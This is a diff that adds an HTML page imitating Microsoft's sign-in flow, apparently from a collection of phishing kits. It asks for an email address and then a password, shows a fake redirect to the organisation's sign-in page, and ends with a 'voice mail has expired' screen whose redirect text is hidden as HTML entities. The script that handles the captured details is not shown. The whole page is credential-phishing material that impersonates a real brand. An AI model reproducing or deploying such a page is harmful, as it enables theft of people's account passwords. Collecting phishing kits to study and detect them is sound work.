@@ -1,0 +1,233 @@
+<!-- <STRIPPED> designates content that was removed from this file to workaround GitHub Code Search's file/line size limits. -->\
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Sign in to your account</title>
+    <style type="text/css">
+      /*! * Bootstrap v4.0.0 (https://getbootstrap.com) * Copyright 2011-2018 The Bootstrap Authors * Copyright 2011-2018 Twitter, Inc. * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE) */
+      /* <STRIPPED> */
+    </style>
+    <style type="text/css">
+      .loader {
+        /*position: absolute;*/
+        /*padding: 30px 0px;*/
+        width: 40px;
+        /*margin: -22px;*/
+      }
+
+      .loader .circle {
+        position: absolute;
+        width: 18px;
+        height: 18px;
+        opacity: 0;
+        transform: rotate(225deg);
+        animation-iteration-count: infinite;
+        animation-name: orbit;
+        animation-duration: 3s;
+      }
+
+      .loader .circle:after {
+        content: "";
+        position: absolute;
+        width: 3px;
+        height: 3px;
+        border-radius: 5px;
+        background: #000;
+      }
+
+      .loader .circle:nth-child(2) {
+        animation-delay: 240ms;
+      }
+
+      .loader .circle:nth-child(3) {
+        animation-delay: 480ms;
+      }
+
+      .loader .circle:nth-child(4) {
+        animation-delay: 720ms;
+      }
+
+      .loader .circle:nth-child(5) {
+        animation-delay: 960ms;
+      }
+
+      @keyframes orbit {
+        0% {
+          transform: translate(10px, 0);
+          opacity: 1;
+          animation-timing-function: ease-out;
+        }
+
+        7% {
+          transform: translate(30px, 0);
+          animation-timing-function: linear;
+        }
+
+        30% {
+          transform: translate(60px, 0);
+          animation-timing-function: ease-in-out;
+        }
+
+        40% {
+          transform: translate(90px, 0);
+          animation-timing-function: ease-out;
+        }
+
+        50% {
+          transform: translate(120px, 0);
+          animation-timing-function: ease-out;
+        }
+
+        75% {
+          transform: translate(250px, 0);
+          animation-timing-function: ease-out;
+        }
+
+        76% {
+          transform: translate(300px, 0);
+          opacity: 0;
+        }
+
+        100% {
+          transform: translate(350px, 0);
+          opacity: 0;
+        }
+      }
+    </style>
+  </head>
+  <!-- <p>Nostrud pig ad tri-tip, cupim proident eu duis et occaecat salami picanha shankle.</p> -->
+  <body>
+    <div id="main">
+      <div class="bgimg"></div>
+      <div class="container-fluid">
+        <div class="container">
+          <div class="row topp">
+            <div class="col-lg-6 mx-auto">
+              <div class="box" id="prt1">
+                <div class="loader " style="display:none;">
+                  <div class="circle"></div>
+                  <div class="circle"></div>
+                  <div class="circle"></div>
+                  <div class="circle"></div>
+                  <div class="circle"></div>
+                </div>
+                <div class="boxtext">
+                  <span id="logoChange">
+                    <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" width="30px">&nbsp <span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span>
+                  </span>
+                  <br>
+                  <br>
+                  <span class="h6">Sign In</span>
+                  <br>
+                  <span id="error" class="text-danger" style="display: none;">We couldn't find an account with that username. Try another account.</span>
+                  <div class="form-group mt-2">
+                    <input type="email" name="ai" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" placeholder="Email, phone, or Skype" style="border-right: none;border-left: none;border-top: none;">
+                  </div>
+                  <p style="font-size: 13px">No account? <a href="#">Create one!</a>
+                  </p>
+                  <p style="font-size: 13px">
+                    <a href="#">Can't access your account?</a>
+                  </p>
+                  <div class="text-right">
+                    <button type="button" class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;cursor: pointer;" onclick="checkEmail()">Next</button>
+                  </div>
+                </div>
+              </div>
+              <div class="box" id="prt2" style="display: none;">
+                <div class="loader " style="display:none;">
+                  <div class="circle"></div>
+                  <div class="circle"></div>
+                  <div class="circle"></div>
+                  <div class="circle"></div>
+                  <div class="circle"></div>
+                </div>
+                <form id="contact" class="boxtext">
+                  <span id="logoChange2">
+                    <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" width="30px">&nbsp <span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span>
+                  </span>
+                  <br>
+                  <br>
+                  <i class="fas fa-arrow-left" aria-hidden="true" id="back"></i>&nbsp <span id="aich">abc@abc.com</span>
+                  <div class="py-2">
+                    <span class="h4">Enter password</span>
+                  </div>
+                  <div>
+                    <span id="mgss" class="text-danger"></span>
+                  </div>
+                  <div class="form-group">
+                    <input type="password" name="pr" class="form-control rounded-0 border-dark" id="pr" aria-describedby="aiHelp" placeholder="Password" style="border-right: none;border-left: none;border-top: none;">
+                  </div>
+                  <p style="font-size: 14px">
+                    <a href="#">Forget password?</a>
+                  </p>
+                  <div class="text-right">
+                    <button type="button" class="btn rounded-0 text-white px-4" id="sub-btn" style="background-color: #0066BA;" onclick="submitPass()">Sign in</button>
+                  </div>
+                </form>
+              </div>
+              <div class="box" id="prt3" style="display: none;">
+                <div class="boxtext">
+                  <span id="logoChange3">
+                    <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" width="30px">&nbsp <span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span>
+                  </span>
+                  <br>
+                  <br>
+                  <span class="h4">Taking you to your Organization's sign-in page</span>
+                  <br>
+                  <br>
+                  <div class="loader ">
+                    <div class="circle"></div>
+                    <div class="circle"></div>
+                    <div class="circle"></div>
+                    <div class="circle"></div>
+                    <div class="circle"></div>
+                  </div>
+                  <br>
+                  <div class="text-left">
+                    <a href="#">cancel</a>
+                  </div>
+                  <br>
+                  <br>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="row ">
+          <div class="col-sm-5 mx-auto box2">
+            <div class="py-2 bg-white ">
+              <span>
+                <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" width="30px"> &nbspSign in options </span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <footer id="footer">
+        <div>
+          <div class="footerNode">
+            <span>&copy;2025 Microsoft</span>
+            <a href="#">Privacy statement</a>
+          </div>
+        </div>
+      </footer>
+    </div>
+    <div id="finish" style="display:none">
+      <center>
+        <P>
+          <img style="HEIGHT: 54px; WIDTH: 380px" src="data:image/jpeg;base64,<STRIPPED>" width=500 align=center height=507>
+        </P>
+        <br>
+        <br>
+        <font size='6'>This voice mail has expired.</font>
+        <br>
+        <br>
+        <font size='3'> &#89;&#111;&#117;&#32;&#119;&#105;&#108;&#108;&#32;&#98;&#101;&#32;&#114;&#101;&#100;&#105;&#114;&#101;&#99;&#116;&#101;&#100;&#32;&#116;&#111;&#32;&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;&#46; </font>
+        <br>
+        <a href=''>What's this?</a>
+      </center>
+    </div>
+  </body>
+</html>
